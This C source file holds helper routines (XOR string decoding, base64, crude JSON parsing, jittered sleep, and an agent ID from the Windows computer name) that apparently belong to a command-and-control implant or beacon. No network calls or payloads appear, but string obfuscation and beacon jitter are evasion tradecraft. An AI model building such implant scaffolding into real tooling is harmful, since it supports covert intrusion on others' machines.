#include "common.h"

void xor_decode(char *s) {
    if (!s) return;
    for (size_t i = 0; s[i]; i++) {
        s[i] ^= (char)XOR_KEY;
    }
}

static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

int base64_encode(const unsigned char *in, size_t in_len, char *out, size_t out_sz) {
    size_t o = 0;
    for (size_t i = 0; i < in_len; i += 3) {
        uint32_t n = (uint32_t)in[i] << 16;
        if (i + 1 < in_len) n |= (uint32_t)in[i + 1] << 8;
        if (i + 2 < in_len) n |= in[i + 2];
        if (o + 4 >= out_sz) return -1;
        out[o++] = b64_table[(n >> 18) & 63];
        out[o++] = b64_table[(n >> 12) & 63];
        out[o++] = (i + 1 < in_len) ? b64_table[(n >> 6) & 63] : '=';
        out[o++] = (i + 2 < in_len) ? b64_table[n & 63] : '=';
    }
    if (o >= out_sz) return -1;
    out[o] = '\0';
    return (int)o;
}

int base64_decode(const char *in, unsigned char *out, size_t out_sz, size_t *written) {
    size_t o = 0;
    int val = 0, valb = -8;
    for (const char *p = in; *p; p++) {
        if (*p == '=') break;
        const char *pos = strchr(b64_table, *p);
        if (!pos) continue;
        val = (val << 6) | (int)(pos - b64_table);
        valb += 6;
        if (valb >= 0) {
            if (o >= out_sz) return -1;
            out[o++] = (unsigned char)((val >> valb) & 0xFF);
            valb -= 8;
        }
    }
    if (written) *written = o;
    return 0;
}

char *json_get_string(const char *json, const char *key, char *out, size_t out_sz) {
    char pat[64];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *p = strstr(json, pat);
    if (!p) return NULL;
    p = strchr(p, ':');
    if (!p) return NULL;
    p++;
    while (*p == ' ' || *p == '\t') p++;
    if (*p != '"') return NULL;
    p++;
    size_t i = 0;
    while (*p && *p != '"' && i + 1 < out_sz) {
        if (*p == '\\' && p[1]) {
            p++;
            out[i++] = *p++;
        } else {
            out[i++] = *p++;
        }
    }
    out[i] = '\0';
    return out;
}

int json_get_int(const char *json, const char *key, int def) {
    char pat[64];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *p = strstr(json, pat);
    if (!p) return def;
    p = strchr(p, ':');
    if (!p) return def;
    return atoi(p + 1);
}

void sleep_jitter(void) {
    int jitter = (int)(SLEEP_MS * JITTER_PCT / 100);
    int extra = jitter > 0 ? (rand() % (jitter + 1)) : 0;
    Sleep((DWORD)(SLEEP_MS + extra));
}

void agent_id_init(char *id, size_t sz) {
    char name[64] = {0};
    DWORD nsz = (DWORD)sizeof(name);
    GetComputerNameA(name, &nsz);
    snprintf(id, sz, "%s-%lu", name, (unsigned long)GetTickCount());
}
